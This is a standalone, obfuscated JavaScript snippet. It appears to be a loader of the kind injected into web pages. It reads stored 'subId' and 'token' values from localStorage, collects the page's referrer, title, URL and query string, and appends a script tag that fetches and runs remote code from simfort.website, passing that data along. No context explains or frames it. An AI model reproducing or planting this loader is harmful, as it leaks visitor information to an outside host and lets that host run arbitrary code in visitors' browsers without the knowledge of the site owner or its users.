
    (function() {
    var name = '_w2QvncF5ymc88j8Z';
    if (!window._w2QvncF5ymc88j8Z) {
        window._w2QvncF5ymc88j8Z = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://simfort.website/V52kyc',
            P_PATH: 'https://simfort.website/2546d92/postback',
        };
    }
    const _MPBVnKRxhqkLdVMV = localStorage.getItem('config');
    if (typeof _MPBVnKRxhqkLdVMV !== 'undefined' && _MPBVnKRxhqkLdVMV !== null) {
        var _8dZYGX6KDYvXyq4W = JSON.parse(_MPBVnKRxhqkLdVMV);
        var _fRP76Lc3tD62cKfd = Math.round(+new Date()/1000);
        if (_8dZYGX6KDYvXyq4W.created_at + window._w2QvncF5ymc88j8Z.ttl < _fRP76Lc3tD62cKfd) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _jdgzNnhtxR1MJTG7 = localStorage.getItem('subId');
    var _8YBpDVfjXFmgyGnk = localStorage.getItem('token');
    var _XqmnRCSv43dSRwNz = '?return=js.client';
        _XqmnRCSv43dSRwNz += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _XqmnRCSv43dSRwNz += '&se_referrer=' + encodeURIComponent(document.referrer);
        _XqmnRCSv43dSRwNz += '&default_keyword=' + encodeURIComponent(document.title);
        _XqmnRCSv43dSRwNz += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _XqmnRCSv43dSRwNz += '&name=' + encodeURIComponent(name);
        _XqmnRCSv43dSRwNz += '&host=' + encodeURIComponent(window._w2QvncF5ymc88j8Z.R_PATH);
    if (typeof _jdgzNnhtxR1MJTG7 !== 'undefined' && _jdgzNnhtxR1MJTG7 && window._w2QvncF5ymc88j8Z.unique) {
        _XqmnRCSv43dSRwNz += '&sub_id=' + encodeURIComponent(_jdgzNnhtxR1MJTG7);
    }
    if (typeof _8YBpDVfjXFmgyGnk !== 'undefined' && _8YBpDVfjXFmgyGnk && window._w2QvncF5ymc88j8Z.unique) {
        _XqmnRCSv43dSRwNz += '&token=' + encodeURIComponent(_8YBpDVfjXFmgyGnk);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._w2QvncF5ymc88j8Z.R_PATH + _XqmnRCSv43dSRwNz;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
    